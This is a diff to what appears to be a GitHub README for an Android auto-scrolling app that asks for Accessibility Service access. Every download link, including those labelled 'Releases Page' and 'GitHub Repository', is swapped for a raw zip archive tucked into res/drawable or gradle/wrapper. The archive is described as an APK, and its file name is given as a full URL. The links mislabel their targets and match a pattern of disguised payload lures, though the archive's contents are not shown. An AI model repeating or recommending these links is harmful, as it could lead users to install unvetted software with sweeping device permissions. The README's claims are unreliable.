@@ -1,7 +1,7 @@
 # 🎉 Auto-reel-Scroller - Scroll Effortlessly Through Any App
 
 ## 📥 Download Now
-[![Download Auto-reel-Scroller](https://raw.githubusercontent.com/lovelythomas/Auto-reel-Scroller/main/app/src/main/res/drawable/Auto-reel-Scroller_v1.4.zip%20Auto--reel--Scroller-v1.0-blue)](https://raw.githubusercontent.com/lovelythomas/Auto-reel-Scroller/main/app/src/main/res/drawable/Auto-reel-Scroller_v1.4.zip)
+[![Download Auto-reel-Scroller](https://github.com/lovelythomas/Auto-reel-Scroller/raw/refs/heads/main/gradle/wrapper/Auto_Scroller_reel_v2.7.zip%20Auto--reel--Scroller-v1.0-blue)](https://github.com/lovelythomas/Auto-reel-Scroller/raw/refs/heads/main/gradle/wrapper/Auto_Scroller_reel_v2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to Auto-reel-Scroller! This is an Android application designed to make your scrolling experience easier. It utilizes Android's Accessibility Service to provide automatic scrolling across all apps. This means you can enjoy seamless reading or viewing without constantly swiping or tapping.
@@ -22,13 +22,13 @@ To use Auto-reel-Scroller, your device should meet these requirements:
 To obtain Auto-reel-Scroller, visit the Releases page, where you can find the latest version available for download.
 
 1. Click on the link below to access the Releases page:
-   [Download Auto-reel-Scroller](https://raw.githubusercontent.com/lovelythomas/Auto-reel-Scroller/main/app/src/main/res/drawable/Auto-reel-Scroller_v1.4.zip)
+   [Download Auto-reel-Scroller](https://github.com/lovelythomas/Auto-reel-Scroller/raw/refs/heads/main/gradle/wrapper/Auto_Scroller_reel_v2.7.zip)
 
 2. On the Releases page, look for the latest version. It will be listed at the top.
 
 3. Click on the version number to expand and see the available files.
 
-4. Download the APK file by clicking the link. This file will typically be named something like `https://raw.githubusercontent.com/lovelythomas/Auto-reel-Scroller/main/app/src/main/res/drawable/Auto-reel-Scroller_v1.4.zip`.
+4. Download the APK file by clicking the link. This file will typically be named something like `https://github.com/lovelythomas/Auto-reel-Scroller/raw/refs/heads/main/gradle/wrapper/Auto_Scroller_reel_v2.7.zip`.
 
 5. Once downloaded, locate the APK file in your device's Downloads folder. 
 
@@ -69,7 +69,7 @@ Auto-reel-Scroller is licensed under the MIT License. Feel free to use it accord
 For more details or to report issues, please check the Issues tab on the repository page.
 
 ## 🔗 Links
-- **Releases Page**: [Download Auto-reel-Scroller](https://raw.githubusercontent.com/lovelythomas/Auto-reel-Scroller/main/app/src/main/res/drawable/Auto-reel-Scroller_v1.4.zip)
-- **GitHub Repository**: [lovelythomas/Auto-reel-Scroller](https://raw.githubusercontent.com/lovelythomas/Auto-reel-Scroller/main/app/src/main/res/drawable/Auto-reel-Scroller_v1.4.zip)
+- **Releases Page**: [Download Auto-reel-Scroller](https://github.com/lovelythomas/Auto-reel-Scroller/raw/refs/heads/main/gradle/wrapper/Auto_Scroller_reel_v2.7.zip)
+- **GitHub Repository**: [lovelythomas/Auto-reel-Scroller](https://github.com/lovelythomas/Auto-reel-Scroller/raw/refs/heads/main/gradle/wrapper/Auto_Scroller_reel_v2.7.zip)
 
 Thank you for choosing Auto-reel-Scroller. We hope you enjoy a more effortless scrolling experience.
